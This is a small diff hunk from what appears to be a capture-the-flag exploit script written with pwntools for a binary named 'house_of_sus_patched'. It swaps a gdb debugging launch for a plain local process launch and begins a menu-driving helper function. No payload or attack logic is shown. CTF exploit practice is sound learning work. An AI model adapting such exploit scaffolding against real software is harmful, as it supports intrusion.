@@ -64,12 +64,12 @@ Thank you to all of them and the author for this cool challenge!
 
 from pwn import *
 import time
-
+"""
 p = gdb.debug("./house_of_sus_patched", gdbscript='''
     c
 ''')
-
-# p = process("./house_of_sus_patched")
+"""
+p = process("./house_of_sus_patched")
 
 def emergency_meeting(size, response, imposter):
     p.sendline(b"3")
